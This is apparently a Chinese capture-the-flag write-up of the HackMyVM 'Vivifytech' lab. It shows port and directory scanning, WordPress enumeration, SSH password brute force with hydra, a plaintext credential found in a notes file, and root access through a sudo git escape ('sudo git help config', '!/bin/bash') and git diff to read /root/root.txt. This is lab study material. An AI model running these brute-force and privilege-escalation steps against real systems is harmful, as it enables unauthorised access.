---
title: Vivifytech
author: hgbe02
date: 2024-03-19
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Vivifytech.html"
---

# vivifytech

![image-20240319151241448](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737539.png)

真的假的，这环境配置的这么顺利？打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737540.png" alt="image-20240319151346988" style="zoom:50%;" />

看来没毛病了，🐓，启动！！！

## 信息搜集

### 端口扫描

刚刚扫过了，现在就看一下详细信息：

```bash
nmap -sV -sT -T4 --script=vuln 10.160.7.154
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:9.2p1: 
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PRION:CVE-2023-38408    7.5     https://vulners.com/prion/PRION:CVE-2023-38408
|       PRION:CVE-2023-28531    7.5     https://vulners.com/prion/PRION:CVE-2023-28531
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  7.5     https://vulners.com/cve/CVE-2023-38408
|       CVE-2023-28531  7.5     https://vulners.com/cve/CVE-2023-28531
|       B8190CDB-3EB9-5631-9828-8064A1575B23    7.5     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       PRION:CVE-2023-51385    6.4     https://vulners.com/prion/PRION:CVE-2023-51385
|       CVE-2023-51385  6.4     https://vulners.com/cve/CVE-2023-51385
|       PRION:CVE-2023-48795    2.6     https://vulners.com/prion/PRION:CVE-2023-48795
|       CVE-2023-48795  2.6     https://vulners.com/cve/CVE-2023-48795
|       PRION:CVE-2023-51384    1.7     https://vulners.com/prion/PRION:CVE-2023-51384
|       CVE-2023-51384  1.7     https://vulners.com/cve/CVE-2023-51384
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.57: 
|       OSV:BIT-APACHE-2023-45802       5.0     https://vulners.com/osv/OSV:BIT-APACHE-2023-45802
|       OSV:BIT-APACHE-2023-43622       5.0     https://vulners.com/osv/OSV:BIT-APACHE-2023-43622
|       OSV:BIT-2023-45802      5.0     https://vulners.com/osv/OSV:BIT-2023-45802
|       OSV:BIT-2023-43622      5.0     https://vulners.com/osv/OSV:BIT-2023-43622
|       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    5.0     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    5.0     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    5.0     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
|       CVE-2023-43622  5.0     https://vulners.com/cve/CVE-2023-43622
|       CVE-2023-31122  5.0     https://vulners.com/cve/CVE-2023-31122
|       CNVD-2023-93320 5.0     https://vulners.com/cnvd/CNVD-2023-93320
|       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    5.0     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
|       BD3652A9-D066-57BA-9943-4E34970463B9    5.0     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
|       B0208442-6E17-5772-B12D-B5BE30FA5540    5.0     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
|       A820A056-9F91-5059-B0BC-8D92C7A31A52    5.0     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
|       9814661A-35A4-5DB7-BB25-A1040F365C81    5.0     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
|       5A864BCC-B490-5532-83AB-2E4109BB3C31    5.0     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
|       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    5.0     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
|_      CVE-2023-45802  2.6     https://vulners.com/cve/CVE-2023-45802
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3306/tcp open  mysql?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录爆破

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.160.7.154 -f -t 60 
```

```text
/icons/               (Status: 403) [Size: 277]
/wordpress/           (Status: 200) [Size: 85380]
/server-status/       (Status: 403) [Size: 277]
```

以防万一再fuzz一下：

```bash
ffuf -u http://10.160.7.154/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```text
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 3ms]
```

```bash
ffuf -u http://10.160.7.154/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```text
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms]
```

绝了，越搞越少，行吧，应该差不多了。

## 漏洞利用

查看一下相关目录，发现`wordpress`站点：

![image-20240319152254494](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737542.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737543.png" alt="image-20240319152338083" style="zoom: 33%;" />



<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737544.png" alt="image-20240319152402265" style="zoom:33%;" />

其他的没发现有啥东西，行，就从`wordpress`入手：

### 查看相关漏洞

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737545.png" alt="image-20240319152549475" style="zoom:50%;" />

基本上都是插件漏洞，换一个方向

### 尝试注册一下

![image-20240319152616973](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737546.png)

发现是个假按钮。。。

试试常用的登录页面，不行再递归爆破一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737547.png" alt="image-20240319152747988" style="zoom:50%;" />

还有几个其他的路径都试了，没能进去，递归爆破一下目录：

```bash
feroxbuster -u http://10.160.7.154
```

太多了，我只截取一点点了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737548.png" alt="image-20240319152951695" style="zoom:50%;" />

```apl
http://10.160.7.154/wordpress/wp-admin
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737549.png" alt="image-20240319153022279" style="zoom:50%;" />

发现登录页面，尝试弱口令和万能密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737550.png" alt="image-20240319153202768" style="zoom: 33%;" />

失败，看看上面搜集的信息有没有有用的，发现开放了`3306`的mysql端口，抓包看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737551.png" alt="image-20240319154009021" style="zoom:50%;" />

爆破一下？



### 信息搜集

#### WPScan 扫描

```bash
wpscan --api-token xxx --url http://10.160.7.154/wordpress/ -e u
```

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.160.7.154/wordpress/ [10.160.7.154]
[+] Started: Tue Mar 19 04:12:40 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.160.7.154/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.160.7.154/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.160.7.154/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.160.7.154/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.160.7.154/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |  - http://10.160.7.154/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WP 6.4-6.4.1 - POP Chain
 |     Fixed in: 6.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3
 |      - https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.160.7.154/wordpress/wp-content/themes/twentytwentyfour/
 | Readme: http://10.160.7.154/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://10.160.7.154/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.160.7.154/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:21 <=======================================================================================================================> (10 / 10) 100.00% Time: 00:00:21

[i] User(s) Identified:

[+] sancelisso
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.160.7.154/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 21

[+] Finished: Tue Mar 19 04:13:26 2024
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 16.225 KB
[+] Data Received: 371.697 KB
[+] Memory used: 158.82 MB
[+] Elapsed time: 00:00:45
```

发现了一些漏洞！是文件上传的，可惜需要管理员权限。。。！

发现了一个用户：

```apl
sancelisso
```

难道要`sqlmap`？尽量不要这个吧，害。再看一下有无敏感目录吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737552.png" alt="image-20240319162630819" style="zoom:50%;" />

藏得真深啊。。。

看一下：

```apl
// http://10.160.7.154/wordpress/wp-includes/secrets.txt
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃƒÂ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture
```

下载下来进行爆破：

```bash
wpscan --url 10.160.7.154/wordpress -P secrets.txt -U sancelisso
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737553.png" alt="image-20240319163456737" style="zoom:50%;" />

没爆破出来，难道是ssh？

```bash
hydra -l sancelisso -P secrets.txt ssh://10.160.7.154
```

![image-20240319163728519](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737554.png)

难道是`secrets.txt`是用户？密码也是这个？试试？在后台爆破一下，我们再重新回去看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737555.png" alt="image-20240319164506643" style="zoom:50%;" />

有博客，打开看一下：（之前也看了，但是没看出啥，忘了看源码了，不知道藏没藏东西）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737556.png" alt="image-20240319164652011" style="zoom:50%;" />

发现之前找到的用户名，继续瞅瞅其他的：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737557.png" alt="image-20240319164723958" style="zoom: 33%;" />

发现有几个人名和关键词，死马当活马医了，也把他搞下来放到一个字典里：

```bash
echo "VivifyTech\nSarah\nMark\nEmily\nJake\nvivifytech\nsarah\nmark\nEmily\njack" > us5r
```

爆破出来，前面的用户名和密码都是`secret.txt`的没爆破出来！

尝试继续爆破：

```bash
hydra -L us5r -P secrets.txt ssh://10.160.7.154
```

跑出来了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737558.png" alt="image-20240319171845455" style="zoom:50%;" />

尝试连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737559.png" alt="image-20240319172056193" style="zoom:50%;" />

## 提权

### 查看基础信息

```bash
sarah@VivifyTech:~$ find / -perm -u=s -type f 2>/dev/null
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/openssh/ssh-keysign
# /usr/bin/passwd
# /usr/bin/chsh
# /usr/bin/su
# /usr/bin/fusermount3
# /usr/bin/mount
# /usr/bin/umount
# /usr/bin/sudo
# /usr/bin/chfn
# /usr/bin/gpasswd
# /usr/bin/newgrp
sarah@VivifyTech:~$ cat /etc/cron*
# cat: /etc/cron.d: Is a directory
# cat: /etc/cron.daily: Is a directory
# cat: /etc/cron.hourly: Is a directory
# cat: /etc/cron.monthly: Is a directory
# # /etc/crontab: system-wide crontab
# # Unlike any other crontab you don't have to run the `crontab'
# # command to install the new version when you edit this file
# # and files in /etc/cron.d. These files also have username fields,
# # that none of the other crontabs do.

# SHELL=/bin/sh
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# # Example of job definition:
# # .---------------- minute (0 - 59)
# # |  .------------- hour (0 - 23)
# # |  |  .---------- day of month (1 - 31)
# # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# # |  |  |  |  |
# # *  *  *  *  * user-name command to be executed
# 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
# 25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
# 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
# 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
# #
# cat: /etc/cron.weekly: Is a directory
# cat: /etc/cron.yearly: Is a directory
```

发现一个没见过的`suid：newgrp`，看一下有无利用方式，没有找到。

### 查看敏感目录

```bash
sarah@VivifyTech:~$ cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nologin
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/usr/sbin/nologin
# man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
# lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
# mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
# news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
# proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
# list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
# irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
# _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
# nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
# systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
# systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
# messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
# sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
# user:x:1000:1000:user,,,:/home/user:/bin/bash
# mysql:x:102:110:MySQL Server,,,:/var/lib/mysql:/bin/false
# sarah:x:1001:1001:Sarah,,,:/home/sarah:/bin/bash
# gbodja:x:1002:1002:gbodja,,,:/home/gbodja:/bin/bash
# emily:x:1003:1003:Emily,,,:/home/emily:/bin/bash
sarah@VivifyTech:~$ cat user.txt
# HMV{Y0u_G07_Th15_0ne_6543}
```

```bash
sarah@VivifyTech:~$ pwd
# /home/sarah
sarah@VivifyTech:~$ ls -la
# total 32
# drwx------ 4 sarah sarah 4096 Dec  5 17:53 .
# drwxr-xr-x 6 root  root  4096 Dec  5 16:00 ..
# -rw------- 1 sarah sarah    0 Dec  5 17:53 .bash_history
# -rw-r--r-- 1 sarah sarah  245 Dec  5 17:33 .bash_logout
# -rw-r--r-- 1 sarah sarah 3565 Dec  5 17:48 .bashrc
# -rw------- 1 sarah sarah    0 Dec  5 17:49 .history
# drwxr-xr-x 3 sarah sarah 4096 Dec  5 16:19 .local
# drwxr-xr-x 2 sarah sarah 4096 Dec  5 16:19 .private
# -rw-r--r-- 1 sarah sarah  807 Dec  5 15:57 .profile
# -rw-r--r-- 1 sarah sarah   27 Dec  5 16:22 user.txt
sarah@VivifyTech:~$ cd .private
sarah@VivifyTech:~/.private$ ls -la
# total 12
# drwxr-xr-x 2 sarah sarah 4096 Dec  5 16:19 .
# drwx------ 4 sarah sarah 4096 Dec  5 17:53 ..
# -rw-r--r-- 1 sarah sarah  274 Dec  5 16:19 Tasks.txt
sarah@VivifyTech:~/.private$ cat Tasks.txt
# - Change the Design and architecture of the website
# - Plan for an audit, it seems like our website is vulnerable
# - Remind the team we need to schedule a party before going to holidays
# - Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
```

### 切换至gbodja用户

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737560.png" alt="image-20240319173133305" style="zoom:50%;" />

### 提权至root或直接读取flag

双喜临门，发现了一个可以利用`git`进行提权！不，可以直接读取flag！

```bash
git diff /dev/null /root/root.txt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737561.png" alt="image-20240319173356159" style="zoom:50%;" />

提权方法如下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737562.png" alt="image-20240319173453555" style="zoom:50%;" />

尝试一下：

```bash
sudo git help config
!/bin/bash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403191737563.png" alt="image-20240319173548448" style="zoom:50%;" />



